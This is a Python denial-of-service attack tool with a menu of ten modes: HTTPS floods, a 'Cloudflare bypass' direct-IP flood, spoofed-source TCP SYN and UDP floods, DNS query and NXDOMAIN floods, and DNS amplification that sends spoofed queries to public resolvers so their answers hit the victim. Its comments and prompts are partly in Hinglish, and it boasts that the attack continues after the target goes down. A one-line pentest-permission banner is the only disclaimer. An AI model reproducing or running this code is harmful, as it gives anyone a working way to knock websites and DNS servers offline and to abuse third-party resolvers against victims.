import socket
import ssl
import threading
import random
import time
import sys
import os
import struct

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0)"
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://twitter.com/"
]

# ===================== DNS HELPERS =====================

# Common open DNS resolvers for amplification
OPEN_DNS_RESOLVERS = [
    "8.8.8.8", "8.8.4.4",          # Google
    "1.1.1.1", "1.0.0.1",          # Cloudflare
    "208.67.222.222", "208.67.220.220", # OpenDNS
    "9.9.9.9", "149.112.112.112",  # Quad9
    "64.6.64.6", "64.6.65.6",      # Verisign
    "199.85.126.10", "199.85.127.10", # Norton
    "216.146.35.35", "216.146.36.36", # Dyn
    "156.154.70.1", "156.154.71.1",   # Neustar
    "8.26.56.26", "8.20.247.20",      # Comodo
    "192.168.1.1", "10.0.0.1",       # Local routers (common open)
    "77.88.8.8", "77.88.8.1",        # Yandex
    "185.228.168.9", "185.228.169.9", # CleanBrowsing
    "205.210.42.205", "205.210.43.205", # SafeDNS
    "84.200.69.80", "84.200.70.40",     # DNS.WATCH
]

# Large domains for ANY query amplification
AMP_DOMAINS = [
    "google.com", "facebook.com", "youtube.com",
    "yahoo.com", "amazon.com", "wikipedia.org",
    "twitter.com", "instagram.com", "linkedin.com",
    "reddit.com", "netflix.com", "microsoft.com",
    "cloudflare.com", "github.com", "whatsapp.com",
    "live.com", "zoom.us", "tiktok.com",
    "bing.com", "office.com", "apple.com",
]

DOMAINS_FOR_DNS_FLOOD = [
    "google.com", "facebook.com", "youtube.com", "yahoo.com",
    "amazon.com", "wikipedia.org", "twitter.com", "instagram.com",
    "linkedin.com", "reddit.com", "netflix.com", "microsoft.com",
    "cloudflare.com", "github.com", "whatsapp.com", "live.com",
    "zoom.us", "tiktok.com", "bing.com", "office.com",
    "baidu.com", "alibaba.com", "tencent.com", "weibo.com",
    "paypal.com", "ebay.com", "cnn.com", "nytimes.com",
    "spotify.com", "dropbox.com", "adobe.com", "salesforce.com",
]

def build_dns_query(domain, query_type=1):
    """Build raw DNS query packet. qtype=1(A), qtype=255(ANY), qtype=15(MX), qtype=16(TXT)"""
    tid = random.randint(0, 65535)
    flags = 0x0100  # Standard query with recursion desired
    
    # Header: ID(2), Flags(2), QDCOUNT(2), ANCOUNT(2), NSCOUNT(2), ARCOUNT(2)
    header = struct.pack('!HHHHHH', tid, flags, 1, 0, 0, 0)
    
    # Question section - encode domain name
    qname = b''
    for part in domain.encode().split(b'.'):
        qname += bytes([len(part)]) + part
    qname += b'\x00'  # terminate
    
    # QTYPE (2), QCLASS (2) = IN (1)
    question = qname + struct.pack('!HH', query_type, 1)
    
    return header + question

def build_dns_any_query(domain):
    """Build DNS ANY query for max amplification (QTYPE=255)"""
    return build_dns_query(domain, query_type=255)

# ===================== ORIGINAL ATTACKS =====================

def build_request(domain):
    ua = random.choice(USER_AGENTS)
    ref = random.choice(REFERERS)
    req = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {domain}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        f"Accept-Language: en-US,en;q=0.5\r\n"
        f"Referer: {ref}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    return req

def attack_domain(domain, port, duration, stats):
    """Domain-based attack (original)"""
    context = ssl.create_default_context()
    timeout = time.time() + duration
    b, r = 0, 0
    consecutive_fails = 0

    while time.time() < timeout:
        try:
            sock = socket.create_connection((domain, port), timeout=5)
            ssl_sock = context.wrap_socket(sock, server_hostname=domain)
            ssl_sock.settimeout(5)

            for _ in range(10):
                request = build_request(domain)
                ssl_sock.send(request.encode())
                b += len(request)
                r += 1
            
            ssl_sock.close()
            consecutive_fails = 0

            if r >= 50:
                with stats['lock']:
                    stats['bytes'] += b
                    stats['reqs'] += r
                b, r = 0, 0

        except Exception:
            consecutive_fails += 1
            delay = min(0.01 * (2 ** min(consecutive_fails, 5)), 0.5)
            time.sleep(delay)
            continue

def attack_ip(ip, port, duration, stats):
    """IP-based Cloudflare bypass - direct IP attack"""
    timeout = time.time() + duration
    b, r = 0, 0
    consecutive_fails = 0
    fake_sni = f"www.{random.randint(100000,999999)}.com"

    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            ctx = ssl._create_unverified_context()
            ssl_sock = ctx.wrap_socket(sock, server_hostname=fake_sni)
            ssl_sock.settimeout(5)
            
            path = random.choice(["/", "/index.html", "/login", "/admin", "/api/", "/wp-admin"])
            ua = random.choice(USER_AGENTS)
            ref = random.choice(REFERERS)
            xff = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            
            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"X-Forwarded-For: {xff}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
                f"Referer: {ref}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode()
            
            for _ in range(5):
                ssl_sock.send(request)
                b += len(request)
                r += 1
            
            ssl_sock.close()
            consecutive_fails = 0
            
            if r >= 50:
                with stats['lock']:
                    stats['bytes'] += b
                    stats['reqs'] += r
                b, r = 0, 0

        except Exception:
            consecutive_fails += 1
            delay = min(0.01 * (2 ** min(consecutive_fails, 5)), 0.5)
            time.sleep(delay)
            continue

def attack_tcp_syn(ip, port, duration, stats):
    """TCP SYN flood - sends massive connection attempts"""
    timeout = time.time() + duration
    b, r = 0, 0
    
    while time.time() < timeout:
        try:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                
                ip_ihl = 5
                ip_ver = 4
                ip_tos = 0
                ip_tot_len = 40
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = 255
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(src_ip)
                ip_daddr = socket.inet_aton(ip)
                ip_ihl_ver = (ip_ver << 4) + ip_ihl
                
                ip_header = struct.pack('!BBHHHBBH4s4s', 
                    ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                    ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
                
                tcp_source = src_port
                tcp_dest = port
                tcp_seq = seq
                tcp_ack_seq = 0
                tcp_doff = 5
                tcp_fin = 0
                tcp_syn = 1
                tcp_rst = 0
                tcp_psh = 0
                tcp_ack = 0
                tcp_urg = 0
                tcp_window = socket.htons(5840)
                tcp_check = 0
                tcp_urg_ptr = 0
                
                tcp_offset_res = (tcp_doff << 4) + 0
                tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
                
                tcp_header = struct.pack('!HHLLBBHHH', 
                    tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                    tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
                
                packet = ip_header + tcp_header
                
                for _ in range(100):
                    s.sendto(packet, (ip, 0))
                    b += len(packet)
                    r += 1
                
                s.close()
                
            except PermissionError:
                for _ in range(50):
                    try:
                        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s2.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                        s2.settimeout(0.5)
                        s2.setblocking(0)
                        s2.connect_ex((ip, port))
                        s2.close()
                        r += 1
                        b += 60
                    except:
                        pass
            
            with stats['lock']:
                stats['bytes'] += b
                stats['reqs'] += r
            b, r = 0, 0
            
        except Exception:
            time.sleep(0.001)
            continue

def attack_udp(ip, port, duration, stats):
    """UDP flood - sends massive garbage packets"""
    timeout = time.time() + duration
    b, r = 0, 0
    
    ports = [port] if port > 0 else [53, 123, 161, 500, 1434, 1900, 5353, 11211, 27015, 3074]
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            size = random.randint(1024, 8192)
            data = random._urandom(size)
            
            for _ in range(50):
                target_port = random.choice(ports)
                try:
                    s.sendto(data, (ip, target_port))
                    b += len(data)
                    r += 1
                except:
                    pass
            
            s.close()
            
            with stats['lock']:
                stats['bytes'] += b
                stats['reqs'] += r
            b, r = 0, 0
            
        except Exception:
            time.sleep(0.001)
            continue

# ===================== DNS-SPECIFIC ATTACKS =====================

def attack_dns_query_flood(ip, port, duration, stats):
    """DNS query flood - seedha DNS server par lakhon queries"""
    timeout = time.time() + duration
    b, r = 0, 0
    
    target_port = port if port > 0 else 53
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(1)
            
            # 50 queries per batch with random domains
            for _ in range(50):
                domain = random.choice(DOMAINS_FOR_DNS_FLOOD)
                qtype = random.choice([1, 15, 16, 28, 33, 255])  # A, MX, TXT, AAAA, SRV, ANY
                query = build_dns_query(domain, qtype)
                try:
                    s.sendto(query, (ip, target_port))
                    b += len(query)
                    r += 1
                except:
                    pass
            
            s.close()
            
            with stats['lock']:
                stats['bytes'] += b
                stats['reqs'] += r
            b, r = 0, 0
            
        except Exception:
            time.sleep(0.001)
            continue

def attack_dns_amplification(target_ip, port, duration, stats):
    """DNS amplification - open resolvers se traffic amplify karke target par bhejna
    
    Ye DNS AMPLIFICATION hai - sabse deadly method!
    Open DNS resolvers ko spoofed request bhejo (src = target IP)
    Resolver bada response target IP par bhejega = AMPLIFICATION (50-100x)
    """
    timeout = time.time() + duration
    b, r = 0, 0
    
    target_port = port if port > 0 else 53
    
    while time.time() < timeout:
        try:
            # Random open resolver choose karo
            resolver = random.choice(OPEN_DNS_RESOLVERS)
            
            # Socket banaye jisse source IP spoof kar sake
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                # Source IP = TARGET (victim) - spoof kiya
                # Destination = Open DNS resolver
                
                src_ip = target_ip  # SPOOFED - victim ban raha hai source
                dst_ip = resolver
                
                domain = random.choice(AMP_DOMAINS)
                dns_query = build_dns_any_query(domain)  # ANY query = max response
                
                # UDP header banao
                src_port = random.randint(1024, 65535)
                dst_port_str = target_port
                udp_len = 8 + len(dns_query)
                udp_check = 0
                
                udp_header = struct.pack('!HHHH', src_port, dst_port_str, udp_len, udp_check)
                
                # IP header banao
                ip_ver = 4
                ip_ihl = 5
                ip_ihl_ver = (ip_ver << 4) + ip_ihl
                ip_tos = 0
                ip_tot_len = 20 + udp_len
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = 64
                ip_proto = socket.IPPROTO_UDP
                ip_check = 0
                ip_saddr = socket.inet_aton(src_ip)  # SPOOFED: victim ka IP
                ip_daddr = socket.inet_aton(dst_ip)
                
                ip_header = struct.pack('!BBHHHBBH4s4s', 
                    ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                    ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
                
                packet = ip_header + udp_header + dns_query
                
                # 10 packets per cycle
                for _ in range(10):
                    s.sendto(packet, (dst_ip, target_port))
                    b += len(packet)
                    r += 1
                
                s.close()
                
            except PermissionError:
                # No root - fallback to direct DNS query flood on open resolvers
                # Isme amplification nahi hoga but still DNS server busy hoga
                s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s2.settimeout(0.5)
                
                for _ in range(20):
                    domain = random.choice(AMP_DOMAINS)
                    query = build_dns_any_query(domain)
                    try:
                        s2.sendto(query, (resolver, target_port))
                        b += len(query)
                        r += 1
                    except:
                        pass
                s2.close()
            
            with stats['lock']:
                stats['bytes'] += b
                stats['reqs'] += r
            b, r = 0, 0
            
        except Exception:
            time.sleep(0.001)
            continue

def attack_dns_nxdomain(target_ip, port, duration, stats):
    """NXDOMAIN flood - non-existent domains query karke DNS server ko exhaust karo
    
    DNS server ko non-existent domains resolve karne mein CPU lagta hai.
    Har baar NXDOMAIN response generate karta hai = CPU exhaust
    """
    timeout = time.time() + duration
    b, r = 0, 0
    
    target_port = port if port > 0 else 53
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Random non-existent domain banaye
            random_domain = f"{random.randint(1000000,9999999)}-{random.randint(1000000,9999999)}-{random.choice(['xyz','top','click','work','download','loan','date'])}"
            
            query = build_dns_query(random_domain, 1)  # A record
            
            for _ in range(100):
                try:
                    s.sendto(query, (target_ip, target_port))
                    b += len(query)
                    r += 1
                except:
                    pass
            
            s.close()
            
            with stats['lock']:
                stats['bytes'] += b
                stats['reqs'] += r
            b, r = 0, 0
            
        except Exception:
            time.sleep(0.001)
            continue

def fmt(b):
    for u in ['B', 'KB', 'MB', 'GB', 'TB']:
        if b < 1024:
            return f"{b:.1f} {u}"
        b /= 1024
    return f"{b:.1f} PB"

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # ===== BADA BANNER =====
    print(f"\033[1;91m╔{'═'*55}╗")
    print(f"\033[1;91m║\033[1;93m  🔥 DNS + TLS FLOOD ATTACK TOOL 🔥\033[1;91m                      ║")
    print(f"\033[1;91m║\033[1;92m  ██████╗ ███████╗██╗   ██╗███████╗██╗      ██████╗ ██████╗ \033[1;91m║")
    print(f"\033[1;91m║\033[1;92m  ██╔══██╗██╔════╝██║   ██║██╔════╝██║     ██╔═══██╗██╔══██╗\033[1;91m║")
    print(f"\033[1;91m║\033[1;92m  ██║  ██║█████╗  ██║   ██║█████╗  ██║     ██║   ██║██████╔╝\033[1;91m║")
    print(f"\033[1;91m║\033[1;92m  ██║  ██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║     ██║   ██║██╔══██╗\033[1;91m║")
    print(f"\033[1;91m║\033[1;92m  ██████╔╝███████╗ ╚████╔╝ ███████╗███████╗╚██████╔╝██║  ██║\033[1;91m║")
    print(f"\033[1;91m║\033[1;92m  ╚═════╝ ╚══════╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝\033[1;91m║")
    print(f"\033[1;91m║\033[1;95m           DNS Server Downer - Developed By Wasey\033[1;91m           ║")
    print(f"\033[1;91m║\033[1;96m  [✓] I have permission and am authorized to perform this pentest\033[1;91m  ║")
    print(f"\033[1;91m╚{'═'*55}╝\033[0m")
    print()
    
    # ===== CHOOSE ATTACK TYPE =====
    print(f"\033[1;96m[?] Choose attack type:\033[0m")
    print(f"\033[1;93m  ── WEB/TLS ATTACKS ──")
    print(f"\033[1;93m  1.\033[1;97m Domain Attack (TLS/HTTPS - like panel.furynode.fun)")
    print(f"\033[1;93m  2.\033[1;97m Cloudflare Bypass (IP-based TLS)")
    print(f"\033[1;93m  3.\033[1;97m TCP SYN Flood (sab TCP ports down)")
    print(f"\033[1;93m  4.\033[1;97m UDP Flood (sab UDP ports down)")
    print(f"\033[1;93m  ── DNS ATTACKS (DNS SERVER DOWN KARNE KE LIYE) ──")
    print(f"\033[1;93m  5.\033[1;97m DNS Query Flood (seedha DNS server par query bomb)")
    print(f"\033[1;93m  6.\033[1;97m DNS Amplification (50-100x amplify - MOST POWERFUL!)")
    print(f"\033[1;93m  7.\033[1;97m DNS NXDOMAIN Flood (non-existent domains se CPU exhaust)")
    print(f"\033[1;93m  ── COMBINED MODES ──")
    print(f"\033[1;93m  8.\033[1;97m ALL WEB MODES (TLS + TCP + UDP ek saath)")
    print(f"\033[1;93m  9.\033[1;97m ALL DNS MODES (QueryFlood + Amp + NXDOMAIN - DNS marega pura!)")
    print(f"\033[1;93m  10.\033[1;97m EVERYTHING (Web + DNS + TCP + UDP - TOTAL ANNIHILATION)")
    print()
    attack_type = input(f"\033[1;93m  >>> \033[0m").strip()
    
    valid_choices = [str(i) for i in range(1, 11)]
    while attack_type not in valid_choices:
        print(f"\033[1;91m[!] Invalid choice! Enter 1-10.\033[0m")
        attack_type = input(f"\033[1;93m  >>> \033[0m").strip()
    
    attack_type_int = int(attack_type)
    target = ""
    attack_funcs = []
    is_dns_mode = False
    
    if attack_type_int == 1:
        print(f"\n\033[1;96m[?] Enter target domain (e.g., panel.furynode.fun):\033[0m")
        domain = input(f"\033[1;93m  >>> \033[0m").strip()
        while not domain:
            domain = input(f"\033[1;93m  >>> \033[0m").strip()
        target = domain
        attack_funcs = [attack_domain]
        
    elif attack_type_int == 2:
        print(f"\n\033[1;96m[?] Enter VPS IP address:\033[0m")
        ip = input(f"\033[1;93m  >>> \033[0m").strip()
        while not ip:
            ip = input(f"\033[1;93m  >>> \033[0m").strip()
        target = ip
        attack_funcs = [attack_ip]
        print(f"\033[1;92m[✓] Cloudflare Bypass active!\033[0m")
        
    elif attack_type_int == 3:
        print(f"\n\033[1;96m[?] Enter target IP:\033[0m")
        ip = input(f"\033[1;93m  >>> \033[0m").strip()
        while not ip:
            ip = input(f"\033[1;93m  >>> \033[0m").strip()
        target = ip
        attack_funcs = [attack_tcp_syn]
        
    elif attack_type_int == 4:
        print(f"\n\033[1;96m[?] Enter target IP:\033[0m")
        ip = input(f"\033[1;93m  >>> \033[0m").strip()
        while not ip:
            ip = input(f"\033[1;93m  >>> \033[0m").strip()
        target = ip
        attack_funcs = [attack_udp]
        
    elif attack_type_int == 5:
        print(f"\n\033[1;96m[?] Enter DNS server IP:\033[0m")
        ip = input(f"\033[1;93m  >>> \033[0m").strip()
        while not ip:
            ip = input(f"\033[1;93m  >>> \033[0m").strip()
        target = ip
        attack_funcs = [attack_dns_query_flood]
        is_dns_mode = True
        print(f"\033[1;92m[✓] DNS Query Flood - Seedha DNS server par query bomb!\033[0m")
        
    elif attack_type_int == 6:
        print(f"\n\033[1;96m[?] Enter target IP (jiska DNS server down karna hai):\033[0m")
        ip = input(f"\033[1;93m  >>> \033[0m").strip()
        while not ip:
            ip = input(f"\033[1;93m  >>> \033[0m").strip()
        target = ip
        attack_funcs = [attack_dns_amplification]
        is_dns_mode = True
        print(f"\033[1;92m[✓] DNS AMPLIFICATION - 50-100x amplify! Open resolvers se target par bomb!\033[0m")
        print(f"\033[1;93m[!] Root/sudo chahiye raw socket spoofing ke liye. Nahi to limited mode chalega.\033[0m")
        
    elif attack_type_int == 7:
        print(f"\n\033[1;96m[?] Enter DNS server IP:\033[0m")
        ip = input(f"\033[1;93m  >>> \033[0m").strip()
        while not ip:
            ip = input(f"\033[1;93m  >>> \033[0m").strip()
        target = ip
        attack_funcs = [attack_dns_nxdomain]
        is_dns_mode = True
        print(f"\033[1;92m[✓] NXDOMAIN Flood - Fake domains se DNS CPU exhaust!\033[0m")
        
    elif attack_type_int == 8:
        print(f"\n\033[1;96m[?] Enter target IP:\033[0m")
        ip = input(f"\033[1;93m  >>> \033[0m").strip()
        while not ip:
            ip = input(f"\033[1;93m  >>> \033[0m").strip()
        target = ip
        attack_funcs = [attack_ip, attack_tcp_syn, attack_udp]
        print(f"\033[1;92m[✓] ALL WEB MODES! TLS + TCP + UDP ek saath!\033[0m")
        
    elif attack_type_int == 9:
        print(f"\n\033[1;96m[?] Enter target IP (jiska DNS server down karna hai):\033[0m")
        ip = input(f"\033[1;93m  >>> \033[0m").strip()
        while not ip:
            ip = input(f"\033[1;93m  >>> \033[0m").strip()
        target = ip
        attack_funcs = [attack_dns_query_flood, attack_dns_amplification, attack_dns_nxdomain]
        is_dns_mode = True
        print(f"\033[1;92m[✓] ALL DNS MODES! QueryFlood + Amplification + NXDOMAIN = DNS pura down!\033[0m")
        
    elif attack_type_int == 10:
        print(f"\n\033[1;96m[?] Enter target IP:\033[0m")
        ip = input(f"\033[1;93m  >>> \033[0m").strip()
        while not ip:
            ip = input(f"\033[1;93m  >>> \033[0m").strip()
        target = ip
        attack_funcs = [attack_ip, attack_tcp_syn, attack_udp, attack_dns_query_flood, attack_dns_amplification, attack_dns_nxdomain]
        is_dns_mode = True
        print(f"\033[1;92m[✓] EVERYTHING! 6 modes ek saath! Nothing will survive!\033[0m")
    
    # ===== INPUT PORT =====
    default_port = 53 if is_dns_mode else 443
    port_str = "53 (DNS)" if is_dns_mode else "443 (HTTPS)"
    print(f"\n\033[1;96m[?] Enter port (press Enter for default {port_str}, 0 = all ports):\033[0m")
    port_input = input(f"\033[1;93m  >>> \033[0m").strip()
    port = default_port
    if port_input:
        try:
            port = int(port_input)
            if port < 0 or port > 65535:
                print(f"\033[1;91m[!] Invalid. Using default {default_port}.\033[0m")
                port = default_port
        except:
            print(f"\033[1;91m[!] Invalid. Using default {default_port}.\033[0m")
    
    # ===== INPUT THREADS =====
    print(f"\n\033[1;96m[?] Enter thread count per attack (press Enter for default 500):\033[0m")
    thr_input = input(f"\033[1;93m  >>> \033[0m").strip()
    threads = 500
    if thr_input:
        try:
            threads = int(thr_input)
            if threads < 1:
                threads = 500
        except:
            pass
    
    # ===== INPUT DURATION =====
    print(f"\n\033[1;96m[?] Enter duration in seconds (press Enter for default 4000):\033[0m")
    dur_input = input(f"\033[1;93m  >>> \033[0m").strip()
    duration = 4000
    if dur_input:
        try:
            duration = int(dur_input)
            if duration < 1:
                duration = 4000
        except:
            pass
    
    total_threads = threads * len(attack_funcs)
    
    # ===== CONFIRMATION =====
    mode_names = {
        attack_domain: "Domain TLS Attack",
        attack_ip: "Cloudflare Bypass TLS",
        attack_tcp_syn: "TCP SYN Flood",
        attack_udp: "UDP Flood",
        attack_dns_query_flood: "DNS Query Flood",
        attack_dns_amplification: "DNS Amplification (50-100x)",
        attack_dns_nxdomain: "DNS NXDOMAIN Flood"
    }
    
    print(f"\n\033[1;91m{'═'*55}")
    print(f"\033[1;93m  ⚡ ATTACK CONFIGURATION ⚡")
    print(f"\033[1;91m{'═'*55}")
    print(f"\033[1;96m  Attack Modes: \033[1;97m{len(attack_funcs)} active\033[0m")
    for af in attack_funcs:
        print(f"\033[1;93m   └►\033[1;97m {mode_names[af]}")
    print(f"\033[1;96m  Target:      \033[1;97m{target}")
    print(f"\033[1;96m  Port:        \033[1;97m{port if port > 0 else 'ALL PORTS'}")
    print(f"\033[1;96m  Threads:     \033[1;97m{threads:,} per mode / {total_threads:,} total")
    print(f"\033[1;96m  Duration:    \033[1;97m{duration}s ({duration//60}m {duration%60}s)")
    print(f"\033[1;91m{'─'*55}")
    if is_dns_mode:
        print(f"\033[1;91m  [⚠] MODE: DNS SERVER DESTROYER!")
        print(f"\033[1;91m  [⚠] DNS Amplification ke liye root chahiye - spoofed IP bhejta hai!")
        print(f"\033[1;91m  [⚠] DNS server ka CPU 100% hoga - domain resolve nahi hoga!")
    print(f"\033[1;91m  [⚠] UNSTOPPABLE - Target down hone par bhi attack jari rahega!")
    print(f"\033[1;91m  [⚠] Ctrl+C cancel. Starting in 5 seconds...")
    print(f"\033[1;91m{'═'*55}\033[0m")
    
    for i in range(5, 0, -1):
        print(f"\033[1;93m     Starting in {i}...\033[0m", end="\r")
        time.sleep(1)
    
    # ===== START =====
    os.system('cls' if os.name == 'nt' else 'clear')
    
    stats = {'bytes': 0, 'reqs': 0, 'lock': threading.Lock()}
    
    print(f"\033[1;91m╔═══ 🔴 UNSTOPPABLE MULTI-MODE ATTACK ═══╗")
    print(f"\033[1;91m║  \033[1;93mTarget:   \033[1;97m{target}:{port if port > 0 else 'ALL PORTS'}")
    print(f"\033[1;91m║  \033[1;93mModes:    \033[1;97m{len(attack_funcs)} active")
    for af in attack_funcs:
        print(f"\033[1;91m║  \033[1;93m           \033[1;97m└► {mode_names[af]}")
    print(f"\033[1;91m║  \033[1;93mThreads:  \033[1;97m{total_threads:,}")
    print(f"\033[1;91m║  \033[1;93mDuration: \033[1;97m{duration}s")
    print(f"\033[1;91m║  \033[1;93mMode:     \033[1;91mUNSTOPPABLE")
    print(f"\033[1;91m║  \033[1;93mDeveloped By Wasey !\033[1;91m")
    print(f"\033[1;91m╚════════════════════════════════════╝")
    print()
    
    print(f"\033[1;96m[*] Deploying {total_threads:,} threads across {len(attack_funcs)} modes...\033[0m")
    
    thread_list = []
    deployed = 0
    
    for af in attack_funcs:
        for i in range(threads):
            t = threading.Thread(target=af, args=(target, port, duration, stats), daemon=True)
            t.start()
            thread_list.append(t)
            deployed += 1
            if deployed % 100 == 0:
                print(f"\033[1;93m{deployed}\033[0m", end=" ", flush=True)
    
    print(f"\033[1;92m [✓] {total_threads:,} threads active!\033[0m")
    print()
    
    # ===== LIVE STATS =====
    start = time.time()
    lb, lr, lt = 0, 0, start
    peak = 0
    check_time = start
    last_down_msg = 0
    
    try:
        while time.time() - start < duration:
            time.sleep(1)
            now = time.time()
            el = int(now - start)
            rem = duration - el
            
            cb = stats['bytes']
            cr = stats['reqs']
            dt = now - lt
            
            if cb == lb and el > 5:
                if now - last_down_msg > 10:
                    print(f"\n\033[1;91m  [⚠] Target seems DOWN! But attack CONTINUES... 💀\033[0m")
                    last_down_msg = now
            
            bps = (cb - lb) / dt if dt else 0
            rps = (cr - lr) / dt if dt else 0
            if bps > peak:
                peak = bps
            
            bar = "▓" * int((el/duration)*20) + "░" * (20 - int((el/duration)*20))
            
            sys.stdout.write(f"\r\033[1;91m[{bar}]\033[0m \033[1;93m{el:4d}s\033[0m/\033[1;91m{duration}s\033[0m \033[1;96m|\033[0m \033[1;92m{fmt(bps):>9}/s\033[0m \033[1;96m|\033[0m \033[1;95m{rps:>7,.0f} r/s\033[0m \033[1;96m|\033[0m \033[1;93m{fmt(cb):>9}\033[0m \033[1;96m|\033[0m \033[1;91mPeak: {fmt(peak):>9}/s\033[0m   ")
            sys.stdout.flush()
            
            lb, lr, lt = cb, cr, now
            
            if now - check_time >= 15:
                avg_bps = cb / (now - start) if (now - start) > 0 else 0
                status = "🟢 ATTACKING" if bps > 0 else "🟡 DOWN - STILL HITTING"
                print(f"\n\033[1;96m  ├ Status: {status} | Avg: {fmt(avg_bps)}/s | Total: {fmt(cb)} | Reqs: {cr:,} | Rem: {rem}s")
                check_time = now
                
    except KeyboardInterrupt:
        print(f"\n\n\033[1;91m[!] Attack stopped by user\033[0m")
    
    el = time.time() - start
    fb, fr = stats['bytes'], stats['reqs']
    
    print(f"\n\033[1;92m{'═'*55}")
    print(f"\033[1;92m  ✅ ATTACK COMPLETE - Developed By Wasey")
    print(f"\033[1;92m{'═'*55}")
    print(f"\033[1;96m  Attack Modes:  \033[1;97m{len(attack_funcs)} active")
    for af in attack_funcs:
        print(f"\033[1;96m                  \033[1;97m└► {mode_names[af]}")
    print(f"\033[1;96m  Target:        \033[1;97m{target}")
    print(f"\033[1;96m  Total Data:    \033[1;97m{fmt(fb)}")
    print(f"\033[1;96m  Total Reqs:    \033[1;97m{fr:,}")
    print(f"\033[1;96m  Avg Bandwidth: \033[1;97m{fmt(fb/el)}/s")
    print(f"\033[1;96m  Peak Bandwidth:\033[1;97m{fmt(peak)}/s")
    print(f"\033[1;96m  RPS:           \033[1;97m{fr/el:,.0f}")
    print(f"\033[1;96m  Time:          \033[1;97m{el:.0f}s ({int(el//60)}m {int(el%60)}s)")
    print(f"\033[1;92m{'═'*55}\033[0m")

if __name__ == "__main__":
    main()
